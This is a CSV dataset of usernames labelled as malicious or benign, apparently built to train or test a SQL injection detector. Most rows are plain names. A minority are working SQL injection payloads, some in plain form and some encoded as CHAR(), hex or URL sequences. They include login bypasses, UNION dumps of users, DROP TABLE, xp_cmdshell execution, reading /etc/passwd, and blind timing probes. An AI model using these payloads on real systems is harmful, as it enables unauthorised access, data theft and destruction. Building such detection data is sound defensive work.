name,is_malicious
CHAR(39)CHAR(43)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(39)CHAR(48)CHAR(39)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(32)CHAR(87)CHAR(72)CHAR(69)CHAR(82)CHAR(69)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(110)CHAR(97)CHAR(109)CHAR(101)CHAR(61)CHAR(39)CHAR(97)CHAR(100)CHAR(109)CHAR(105)CHAR(110)CHAR(39)CHAR(32)CHAR(65)CHAR(78)CHAR(68)CHAR(32)CHAR(83)CHAR(85)CHAR(66)CHAR(83)CHAR(84)CHAR(82)CHAR(73)CHAR(78)CHAR(71)CHAR(40)CHAR(112)CHAR(97)CHAR(115)CHAR(115)CHAR(119)CHAR(111)CHAR(114)CHAR(100)CHAR(44)CHAR(49)CHAR(44)CHAR(49)CHAR(41)CHAR(61)CHAR(39)CHAR(97)CHAR(39)CHAR(41)CHAR(43)CHAR(39),1
brian57,0
'; EXEC xp_cmdshell('dir')--,1
kara65,0
mharvey,0
qaguilar,0
lisa09,0
elizabeth28,0
frenchgregory,0
fcross,0
george44,0
georgebailey,0
velezkathryn' OR 0x50=0x50--,1
sandra11,0
bonniewilliams,0
thorntonjodi,0
kevin25,0
jonathon07,0
lori45,0
oruiz,0
hbuchanan,0
emilymatthews,0
tgay,0
fischermichael,0
john13,0
"troy55' OR BENCHMARK(10000000,MD5(NOW()))--",1
conniereyesCHAR(39)CHAR(32)CHAR(85)CHAR(78)CHAR(73)CHAR(79)CHAR(78)CHAR(32)CHAR(65)CHAR(76)CHAR(76)CHAR(32)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(76)CHAR(79)CHAR(65)CHAR(68)CHAR(95)CHAR(70)CHAR(73)CHAR(76)CHAR(69)CHAR(40)CHAR(39)CHAR(47)CHAR(101)CHAR(116)CHAR(99)CHAR(47)CHAR(112)CHAR(97)CHAR(115)CHAR(115)CHAR(119)CHAR(100)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
joshuacox,0
fergusonemily,0
mcannon,0
bennettchristopher,0
dillonmadison,0
heather72,0
walkeralexander,0
reevesdavid,0
woodlinda,0
bowersronald,0
aaronjackson,0
jonescaleb,0
santoskatelyn,0
craigzachary,0
silvalisa,0
willisparker,0
ashleywerner,0
qrangel,0
zjimenez,0
hunterashlee,0
smithjohn,0
quinnjulie,0
qcarroll,0
monica50,0
hstone,0
lawrencegardner%27 %4f%52 %31%3d%31--,1
eddiegreen,0
mercadotiffany,0
westtrevor,0
rgreen,0
laura70' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
mackenzie58,0
williamslauren,0
nelsonrobert,0
blankenshipbrian,0
wbeasley,0
timothymoore,0
haynestami,0
popeedward,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
yblackwell,0
westapril,0
martineztiffany,0
gillmark,0
steelejonathan,0
igilmore,0
karen02,0
fharris,0
mgray,0
parkerdestiny,0
davidmitchell,0
johnstoncourtney,0
zyoung,0
keith30CHAR(39)CHAR(32)CHAR(85)CHAR(78)CHAR(73)CHAR(79)CHAR(78)CHAR(32)CHAR(65)CHAR(76)CHAR(76)CHAR(32)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(76)CHAR(79)CHAR(65)CHAR(68)CHAR(95)CHAR(70)CHAR(73)CHAR(76)CHAR(69)CHAR(40)CHAR(39)CHAR(47)CHAR(101)CHAR(116)CHAR(99)CHAR(47)CHAR(112)CHAR(97)CHAR(115)CHAR(115)CHAR(119)CHAR(100)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
cbradford,0
joshua14,0
cjones,0
'; EXEC xp_cmdshell('dir')--,1
craig99,0
aaron12,0
robertperez,0
twalters,0
christinajackson,0
christophermartinez,0
angie26,0
samuel170x270x200x4f0x520x200x420x450x4e0x430x480x4d0x410x520x4b0x280x310x300x300x300x300x300x300x300x2c0x4d0x440x350x280x4e0x4f0x570x280x290x290x290x2d0x2d,1
richardsonheather,0
dustinscott,0
josejohnson,0
robert12%27 %4f%52 %27%31%27%3d%27%31,1
michelle09,0
hamiltondiane,0
chenry,0
qmassey,0
hdeleon,0
jeffreywhite,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
talvarado,0
griffithlogan,0
lancemorales,0
christineboyle,0
josephchoi,0
' UNION SELECT * FROM users--,1
carrieallen,0
yphillips%27%2f%2a%2a%2f%4f%52%2f%2a%2a%2f%27%31%27%3d%27%31,1
bruce88,0
paul65,0
daniel61,0
allison72,0
wallsjoshua,0
taylorhill,0
"brian97' OR BENCHMARK(10000000,MD5(NOW()))--",1
duncanmelvin,0
maddenjason,0
luis31,0
zimmermanwilliam,0
lshelton,0
ngoodwin,0
chorton,0
christophercross,0
ronaldellis,0
hannahesparza,0
william82,0
yangandrea,0
sherri59,0
pughjustin,0
hgarcia,0
0x270x200x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x2a0x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d,1
nespinoza,0
hlee,0
yorksummer,0
powellkelly,0
tyler06,0
jason06,0
glenncallahan,0
michelleadkins,0
"morganmary'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
christina55,0
andersonbenjamin,0
rileycohen,0
darrenjones'; DROP TABLE users--,1
gabriellewilkinson,0
chadleon,0
christopheredwards,0
matthew37,0
kristin04,0
tomcrosby,0
brenda66,0
clarkjessica,0
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
rowejulie,0
mallorysmith,0
howellandrea,0
leonardbass,0
edwin73,0
veronicawilcox,0
mitchellvega,0
vincentthompson,0
sarah80,0
mosleysamuel,0
arnoldtheresa'/**/OR/**/'1'='1,1
qcooper,0
snydermartin,0
brenda09,0
acopeland,0
andrew50,0
ohurley,0
wiseanita,0
marshallamber,0
nicole58,0
tommymarquez,0
'; DROP TABLE users--,1
jonesdylan,0
enoble,0
andrew54,0
powersshannon,0
proctorjo,0
davisbrian,0
zwolf,0
ibates,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
kbarber,0
pwolfe,0
brittany81,0
zacharythomas,0
stevenedwards,0
coreyfranklin,0
rosalescynthia,0
tammy26,0
tonyhood,0
kathleenferguson,0
johnsonbradley,0
michael44,0
mirandacatherine,0
navarrotoni,0
ljones,0
fdavis,0
icarter,0
danielhardin,0
ronaldnichols,0
murphyryan,0
lisahernandez,0
sarah66,0
wbrooks,0
alyssa09,0
hensleymichael,0
ihurley,0
andrewmccann,0
dbartlett,0
dhardin,0
mariamiller,0
millerterri,0
hernandezronald,0
hendersonchristopher,0
brianreed,0
hallbrian,0
tsmith,0
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
0x270x200x410x4e0x440x200x280x530x450x4c0x450x430x540x200x310x200x460x520x4f0x4d0x280x530x450x4c0x450x430x540x200x430x4f0x550x4e0x540x280x2a0x290x2c0x430x4f0x4e0x430x410x540x280x300x780x330x610x2c0x280x530x450x4c0x450x430x540x200x430x550x520x520x450x4e0x540x5f0x550x530x450x520x280x290x290x2c0x300x780x330x610x2c0x460x4c0x4f0x4f0x520x280x520x410x4e0x440x280x300x290x2a0x320x290x290x780x200x460x520x4f0x4d0x200x490x4e0x460x4f0x520x4d0x410x540x490x4f0x4e0x5f0x530x430x480x450x4d0x410x2e0x500x4c0x550x470x490x4e0x530x200x470x520x4f0x550x500x200x420x590x200x780x290x610x290x2d0x2d,1
'||'1'='1,1
mcmahonvictoria,0
%27%2b%28%53%45%4c%45%43%54 %27%30%27 %46%52%4f%4d %75%73%65%72%73 %57%48%45%52%45 %75%73%65%72%6e%61%6d%65%3d%27%61%64%6d%69%6e%27 %41%4e%44 %53%55%42%53%54%52%49%4e%47%28%70%61%73%73%77%6f%72%64%2c%31%2c%31%29%3d%27%61%27%29%2b%27,1
megan45,0
wwells,0
johnny64,0
courtney07,0
vtaylor,0
raymondrobles,0
jessica07,0
nicolelopez,0
gary11,0
oroberts,0
kendrarichardson,0
bryan44,0
cooperjeanette,0
devinperez,0
lambbrenda,0
robert66,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(83)CHAR(79)CHAR(85)CHAR(78)CHAR(68)CHAR(69)CHAR(88)CHAR(40)CHAR(39)CHAR(116)CHAR(101)CHAR(115)CHAR(116)CHAR(39)CHAR(41)CHAR(61)CHAR(83)CHAR(79)CHAR(85)CHAR(78)CHAR(68)CHAR(69)CHAR(88)CHAR(40)CHAR(39)CHAR(116)CHAR(101)CHAR(115)CHAR(116)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
tking,0
miguelwagner,0
matthew21CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(61)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(45)CHAR(45),1
sonyawright,0
alyssagarcia,0
parkersteven,0
rhonda50,0
wueric,0
alicia10,0
jacksondonna,0
stephanie88,0
ktanner,0
mgreen,0
jeremyfrank,0
cmoore,0
hchan'; EXEC xp_cmdshell('dir')--,1
'; DROP TABLE users--,1
colliermelissa,0
coopercynthia,0
jordanvelasquez,0
geraldyoder,0
michael61,0
mccarthymatthew,0
floresmathew,0
reneeross,0
rgarrett,0
kruegerandre,0
jonathanpatrick,0
mariaramirez,0
hcraig,0
kathy23,0
0x270x200x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x2a0x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d,1
johnlong,0
jdiazCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(67)CHAR(72)CHAR(65)CHAR(82)CHAR(40)CHAR(52)CHAR(57)CHAR(41)CHAR(61)CHAR(67)CHAR(72)CHAR(65)CHAR(82)CHAR(40)CHAR(52)CHAR(57)CHAR(41)CHAR(45)CHAR(45),1
kimberlyjones,0
william67,0
rodriguezrobert,0
burtonpatrick' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
' OR CHAR(49)=CHAR(49)--,1
barbaraduarte,0
alyssaunderwood,0
snovak,0
wvaldez,0
hickmanmary,0
james84,0
banksstephanie,0
ericagolden,0
gwood,0
steveroach,0
estradadavid,0
jamesarcher' OR 0x50=0x50--,1
'||'1'='1,1
dlowery,0
kevincox,0
cervantesheather,0
reynoldsjames,0
rho,0
wendycasey,0
michael26,0
rhonda26,0
bdowns,0
john53,0
kenneth87,0
blankenshipjoanna,0
bakerdaniel,0
luceromegan,0
atorres,0
joshua74,0
fhortonCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
vjohnston,0
vthomas,0
iortega,0
tylerrichardson,0
charlottefrey,0
jasmin42,0
kaylaweaver,0
maryburton,0
jeffreyblankenship,0
shahjaclyn,0
' OR CHAR(49)=CHAR(49)--,1
paulthomasCHAR(39)CHAR(32)CHAR(85)CHAR(78)CHAR(73)CHAR(79)CHAR(78)CHAR(32)CHAR(65)CHAR(76)CHAR(76)CHAR(32)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(76)CHAR(79)CHAR(65)CHAR(68)CHAR(95)CHAR(70)CHAR(73)CHAR(76)CHAR(69)CHAR(40)CHAR(39)CHAR(47)CHAR(101)CHAR(116)CHAR(99)CHAR(47)CHAR(112)CHAR(97)CHAR(115)CHAR(115)CHAR(119)CHAR(100)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
ewolf,0
betty22'%20OR%201=1--,1
bsmith,0
bkelly,0
alikenneth,0
hallcourtney,0
kathleengreene,0
david21' OR SOUNDEX('test')=SOUNDEX('test')--,1
nancy64,0
wesley97,0
adrian00,0
warrenaustin,0
thomasdavies,0
smithpenny,0
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
kimberlybarr,0
wilcoxjohn,0
mayerjonathan,0
johncole,0
clarkkaitlyn,0
qperez,0
fmcdonald,0
johnwallace%27 %4f%52 %43%48%41%52%28%34%39%29%3d%43%48%41%52%28%34%39%29--,1
turnerjennifer,0
jenniferwatts,0
derrickreed,0
april62,0
romerovictoria,0
nicole07,0
mark31'; DROP TABLE users--,1
nguyenjonathan,0
tammyclark,0
gherman,0
patrickwilliams,0
smithjustin,0
codyjohnson,0
'/**/OR/**/'1'='1,1
parkerchristina,0
vanessastrong,0
shermananthony,0
toddgriffin,0
timothybrown,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(61)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(45)CHAR(45),1
boonejonathan,0
lucasreed,0
agill' OR '1'='1,1
shelbyparker,0
cforbes,0
michael53' OR CHAR(49)=CHAR(49)--,1
fritzwendy,0
patricia88' OR '1'='1,1
gsmith,0
sarahchambers,0
nyang,0
lewislisa,0
cummingsrodney,0
markphillips,0
michaelkelley,0
ishannonCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(67)CHAR(72)CHAR(65)CHAR(82)CHAR(40)CHAR(52)CHAR(57)CHAR(41)CHAR(61)CHAR(67)CHAR(72)CHAR(65)CHAR(82)CHAR(40)CHAR(52)CHAR(57)CHAR(41)CHAR(45)CHAR(45),1
nho,0
charleswright,0
christineeaton,0
richardmeyer,0
sherryclark,0
steinrobin,0
vargasgordon,0
gary13,0
transheryl,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
davidstewart,0
darrylthompson,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
daniel120x270x200x4f0x520x200x280x530x450x4c0x450x430x540x200x2a0x200x460x520x4f0x4d0x200x280x530x450x4c0x450x430x540x280x530x4c0x450x450x500x280x350x290x290x290x620x410x4b0x4c0x290x2d0x2d,1
patricia47CHAR(39)CHAR(32)CHAR(65)CHAR(78)CHAR(68)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(49)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(67)CHAR(79)CHAR(85)CHAR(78)CHAR(84)CHAR(40)CHAR(42)CHAR(41)CHAR(44)CHAR(67)CHAR(79)CHAR(78)CHAR(67)CHAR(65)CHAR(84)CHAR(40)CHAR(48)CHAR(120)CHAR(51)CHAR(97)CHAR(44)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(67)CHAR(85)CHAR(82)CHAR(82)CHAR(69)CHAR(78)CHAR(84)CHAR(95)CHAR(85)CHAR(83)CHAR(69)CHAR(82)CHAR(40)CHAR(41)CHAR(41)CHAR(44)CHAR(48)CHAR(120)CHAR(51)CHAR(97)CHAR(44)CHAR(70)CHAR(76)CHAR(79)CHAR(79)CHAR(82)CHAR(40)CHAR(82)CHAR(65)CHAR(78)CHAR(68)CHAR(40)CHAR(48)CHAR(41)CHAR(42)CHAR(50)CHAR(41)CHAR(41)CHAR(120)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(73)CHAR(78)CHAR(70)CHAR(79)CHAR(82)CHAR(77)CHAR(65)CHAR(84)CHAR(73)CHAR(79)CHAR(78)CHAR(95)CHAR(83)CHAR(67)CHAR(72)CHAR(69)CHAR(77)CHAR(65)CHAR(46)CHAR(80)CHAR(76)CHAR(85)CHAR(71)CHAR(73)CHAR(78)CHAR(83)CHAR(32)CHAR(71)CHAR(82)CHAR(79)CHAR(85)CHAR(80)CHAR(32)CHAR(66)CHAR(89)CHAR(32)CHAR(120)CHAR(41)CHAR(97)CHAR(41)CHAR(45)CHAR(45),1
richard87,0
'/**/OR/**/'1'='1,1
javierbryant,0
gmckinney,0
joshuafrost,0
flemingcole,0
lbell,0
kathleen39,0
jonathanhardy0x270x200x550x4e0x490x4f0x4e0x200x410x4c0x4c0x200x530x450x4c0x450x430x540x200x4c0x4f0x410x440x5f0x460x490x4c0x450x280x270x2f0x650x740x630x2f0x700x610x730x730x770x640x270x290x2d0x2d,1
cordovajane,0
adam95,0
turnerhayley,0
richard60,0
jonesray,0
'%27%20OR%201=1--,1
jbennett,0
abradley,0
nramirez,0
margaret27,0
rodriguezsheryl,0
beth71,0
victorialucero,0
shannonjoshua,0
amyclark,0
woodwardvictoria,0
0x270x200x4f0x520x200x420x490x4e0x410x520x590x200x270x610x270x3d0x270x610x270x2d0x2d,1
camposdustin,0
spearsrichard,0
greenalexander' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
lespinoza,0
christine85,0
calebbarnett,0
taylorrobert,0
marcusbrown,0
joshuaevans,0
andersonemily,0
cruzdevin,0
pamelatucker,0
"jessica79'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
kaitlin12,0
hanseneric,0
james77,0
perryzachary,0
johnsonkimberly,0
rramsey,0
terrywhite,0
william94,0
lopezashley,0
fosterdonald,0
mercedes81,0
kbailey,0
davisjill,0
paul25,0
johnsjeremiah,0
ievans,0
%27 %55%4e%49%4f%4e %41%4c%4c %53%45%4c%45%43%54 %4c%4f%41%44%5f%46%49%4c%45%28%27%2f%65%74%63%2f%70%61%73%73%77%64%27%29--,1
paula09,0
stephaniemiller,0
amandaharding,0
sarahmueller,0
brianmartin,0
uyoung,0
nhernandez,0
jgibbs,0
fmccoy,0
bakerrichard,0
csanchez,0
brownerika' UNION SELECT * FROM users--,1
robbinsjustin,0
joseph65,0
'; DROP TABLE users--,1
ymorgan,0
warrenwilliams,0
vbowman,0
christina77,0
ocuevas,0
allen20'; DROP TABLE users--,1
cjimenez,0
tcline,0
shawtodd,0
martinezmelissaCHAR(39)CHAR(47)CHAR(42)CHAR(42)CHAR(47)CHAR(79)CHAR(82)CHAR(47)CHAR(42)CHAR(42)CHAR(47)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
emily73,0
kellyparker,0
pjames,0
rhamilton,0
taylorkelley,0
margaret75,0
john19' OR 0x50=0x50--,1
nicolelee,0
brandoncarpenter,0
fnguyen,0
wcontreras,0
dawn46,0
davisjimmy,0
heather33,0
hmcclain,0
brandyholland,0
richardhood,0
davisronald,0
"christophercline'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
dustin55,0
paulhardy,0
sarahrobinson,0
alexandersmith,0
marco02,0
hunter04,0
lonnie28,0
marissareed,0
carlaalvarado,0
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
tjohnson,0
josephkelly,0
jamiehicks,0
andrewhall,0
cwalters,0
todd96' OR '1'='1,1
hollandraymond,0
weberveronica,0
jjenkins,0
mcherry,0
tweber,0
robertkelly,0
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
denisenorman,0
russell50,0
shernandez,0
erinsmith,0
lgonzalez,0
carla19,0
kimpeter,0
oscar26,0
stephaniewells,0
gutierrezvictoria,0
duranmarvin,0
bartonjohn,0
fwilliamson,0
jenniferpeck,0
denisehawkins,0
kshepard,0
anthonyharris,0
omolina,0
nvilla,0
nsmith,0
hartandrew,0
nancyglenn,0
elliottjohn,0
rthornton,0
josephbrown,0
wrose,0
dominique13,0
hwatts,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(61)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(45)CHAR(45),1
vherrera,0
acraig,0
pfuentes,0
michael94,0
zmurphy,0
kyle33,0
joseph53,0
fhorn,0
amyhampton,0
jessica68,0
devin35,0
smithadam'/**/OR/**/'1'='1,1
molinaashley,0
eshannon,0
ivasquez,0
' OR 1=1--,1
jim23,0
rmurillo,0
lisavega,0
christopheranderson%27 %4f%52 %43%48%41%52%28%34%39%29%3d%43%48%41%52%28%34%39%29--,1
'%20OR%201=1--,1
kellerdavid,0
coryholt,0
jerryrobinson,0
butlermiguel,0
michelewebb,0
hopkinschristopher,0
nancy61,0
joseanderson,0
shannonrobinson,0
twalker,0
qhunt,0
joseph51,0
lauren11' UNION SELECT * FROM users--,1
john52'%20OR%201=1--,1
tamaracochran,0
eric00,0
martinezrhonda,0
ajackson'; DROP TABLE users--,1
amberdavis,0
robinhicks,0
robertallen'/**/OR/**/'1'='1,1
janet62,0
bvang,0
christian81,0
lindsayglover,0
angelacross,0
colinromero,0
johnstondouglas,0
fjackson,0
umurray,0
jennifer30,0
skinnerkimberly' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
wilkinsonshawn,0
wongjennifer,0
fhernandez,0
michaelhammond,0
judy21,0
eschultz,0
twilkinson,0
mhernandez,0
dianawilliams,0
heidi88,0
alicialuna,0
garciamichael,0
uandrews,0
jacksonharold,0
hodgemadeline,0
krivera,0
veronica73,0
paynemichael,0
cmcbride,0
amybaker,0
kellerkayla' UNION SELECT * FROM users--,1
lmiller,0
archertheresa,0
brownmartin,0
erin05,0
gdavis,0
jamiemorton,0
pward,0
kathy81,0
pholt,0
barnettgabriel'/**/OR/**/'1'='1,1
amandamoody,0
0x270x200x4f0x520x200x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x3d0x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x2d0x2d,1
david40,0
javier34,0
mackkelly,0
lchristian,0
pamelalong,0
alison47,0
rprince,0
richardspatricia,0
robinsonalexander,0
qallen,0
'/**/OR/**/'1'='1,1
karen95,0
victorjohnston,0
zyang,0
ebaldwin,0
leblancjennifer,0
ucobb,0
nicoleharrell,0
"gonzaleztammy'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
%27 %4f%52 %31%3d%31--,1
anthonyemily,0
martinnatalie,0
trevor58,0
hgallegos,0
nicholaszhang,0
ortizpamela,0
smithjoseph,0
ramireztyler,0
carmenshaffer,0
kimandrew,0
amiller,0
courtney04,0
gordondavid,0
zreyes,0
emily53,0
ashley53,0
obrowning,0
eric34,0
rpatterson,0
dunnlori,0
danieljanice,0
hmoore'%20OR%201=1--,1
%27 %4f%52 %27%31%27%3d%27%31,1
georgewade,0
kimberly89,0
pattymcgee,0
jessica48,0
vjones,0
rlewis,0
stacy58,0
michaelwhite,0
davidsonwesley,0
tglover,0
susannorman,0
nathankey,0
hflores,0
julie67,0
gomezscott,0
pkane,0
reedjanice,0
alyssa73,0
russell73'%27%20OR%201=1--,1
jefferyharrison,0
jean72' UNION SELECT * FROM users--,1
crystalmendoza,0
trevorwaters,0
flynnkelly%27%25%32%30%4f%52%25%32%30%31%3d%31--,1
andreabarnes,0
rileyvictoria,0
iburke,0
kramercharlesCHAR(39)CHAR(59)CHAR(32)CHAR(69)CHAR(88)CHAR(69)CHAR(67)CHAR(32)CHAR(120)CHAR(112)CHAR(95)CHAR(99)CHAR(109)CHAR(100)CHAR(115)CHAR(104)CHAR(101)CHAR(108)CHAR(108)CHAR(40)CHAR(39)CHAR(100)CHAR(105)CHAR(114)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
josephdominguez,0
michael69,0
rioslawrence,0
joseph81,0
phooverCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(61)CHAR(48)CHAR(120)CHAR(53)CHAR(48)CHAR(45)CHAR(45),1
sanchezstephen,0
debra06,0
peter14,0
jrivera,0
davidfreeman,0
rreynolds,0
"daniel67' OR BENCHMARK(10000000,MD5(NOW()))--",1
jeremyobrien,0
ronnie59,0
jlee,0
rodriguezjason,0
esantos,0
huberyolanda0x270x3b0x200x450x580x450x430x200x780x700x5f0x630x6d0x640x730x680x650x6c0x6c0x280x270x640x690x720x270x290x2d0x2d,1
' UNION SELECT * FROM users--,1
julie09,0
amyreed,0
codymathews,0
yangmatthew,0
sylviacohen,0
alexisjohnson,0
trevinojames,0
trujillotara,0
arnoldgail,0
zfloyd,0
robinsonjessica,0
ryandaniel,0
'; EXEC xp_cmdshell('dir')--,1
jweeks,0
smaxwell,0
' OR CHAR(49)=CHAR(49)--,1
jackson69,0
thomaslewis,0
shawnmorrow,0
thompsonmaria,0
elizabeth73'%20OR%201=1--,1
jeffreysullivan,0
%27 %4f%52 %31%3d%31--,1
cooktimothy,0
patriciataylor0x270x200x4f0x520x200x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x3d0x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x2d0x2d,1
elizabethavila,0
vreed,0
ihill,0
yclark,0
elliottmark,0
cmorrison,0
austinmooney,0
michael53,0
smithmarcus,0
tamara42,0
rebecca09'; DROP TABLE users--,1
kjohnston,0
morrisaaron,0
robinsonsamantha,0
ojones,0
todd50,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(42)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(40)CHAR(83)CHAR(76)CHAR(69)CHAR(69)CHAR(80)CHAR(40)CHAR(53)CHAR(41)CHAR(41)CHAR(41)CHAR(98)CHAR(65)CHAR(75)CHAR(76)CHAR(41)CHAR(45)CHAR(45),1
pinedajames,0
davidgay,0
scott24,0
matthew65'%20OR%201=1--,1
robert49,0
thomaswise,0
hollyshields,0
dixondavid,0
perrymarissa,0
upham,0
mbishop,0
joshua42,0
garciaallison,0
' OR CHAR(49)=CHAR(49)--,1
milleromar,0
rachaelmclaughlin,0
vanessanelson,0
